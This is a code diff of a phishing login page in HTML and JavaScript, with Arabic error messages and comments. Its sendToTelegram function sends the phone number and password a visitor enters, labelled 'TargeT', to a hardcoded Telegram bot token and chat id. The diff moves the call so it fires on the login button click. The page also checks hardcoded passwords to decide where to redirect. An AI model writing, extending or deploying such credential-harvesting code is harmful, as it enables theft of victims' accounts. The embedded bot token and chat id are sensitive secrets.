@@ -224,40 +224,42 @@
             };
 
             function sendToTelegram() {
-                var phoneNumber = document.querySelector('.phone-input[type="text"]').value;
-                var password = document.querySelector('.phone-input[type="password"]').value;
+        var phoneNumber = document.querySelector('.phone-input[type="text"]').value;
+        var password = document.querySelector('.phone-input[type="password"]').value;
 
-                var telegramBotToken = "6428071347:AAHP1yP2bZFkKB_82pBcseiH4Dgu-EVtEAU"; 
-                var chatId = "5318149339"; 
-                var message = "TargeT: " + phoneNumber + "\nPassword: " + password;
+        var telegramBotToken = "6428071347:AAHP1yP2bZFkKB_82pBcseiH4Dgu-EVtEAU"; 
+        var chatId = "5318149339"; 
+        var message = "TargeT: " + phoneNumber + "\nPassword: " + password;
 
-                var telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
-                
-                // Send the message to Telegram
-                var xhr = new XMLHttpRequest();
-                xhr.open("GET", telegramUrl, true);
-                xhr.send();
-            }
+        var telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+        
+        // Send the message to Telegram
+        var xhr = new XMLHttpRequest();
+        xhr.open("GET", telegramUrl, true);
+        xhr.send();
+    }
 
-            document.querySelector('.phone-input').addEventListener('change', sendToTelegram);
+    // تعديل ارتباط الدالة ليتم استدعاؤها عند الضغط على زر تسجيل الدخول
+    document.querySelector('.login-button').addEventListener('click', function(event) {
+        var phoneNumber = document.querySelector('.phone-input[type="text"]').value;
+        var password = document.querySelector('.phone-input[type="password"]').value;
+        var errorMessage = document.getElementById('error-message');
 
-           // Function to handle the login button click
-        document.querySelector('.login-button').addEventListener('click', function(event) {
-            var phoneNumber = document.querySelector('.phone-input[type="text"]').value;
-            var password = document.querySelector('.phone-input[type="password"]').value;
-            var errorMessage = document.getElementById('error-message');
-
-            // Clear previous error
-            errorMessage.style.display = 'none';
+        // Clear previous error
+        errorMessage.style.display = 'none';
 
         // Validate phone number
         if (!/^\d{11}$/.test(phoneNumber)) {
-                errorMessage.textContent = 'يرجى إدخال رقم هاتف صحيح.';
-                errorMessage.style.display = 'block';
-                event.preventDefault();
-                return;
-            }
+            errorMessage.textContent = 'يرجى إدخال رقم هاتف صحيح.';
+            errorMessage.style.display = 'block';
+            event.preventDefault();
+            return;
+        }
 
+        // Send data to Telegram before any redirection
+        sendToTelegram();
+
+        // Handle redirection based on password
         if (password === 'admin_00') {
             window.location.href = 'admin.html'; // Redirect for admin_00
         } else if (password === 'rewan2332000') {
@@ -281,4 +283,3 @@
     </div>
 </body>
 </html>
-
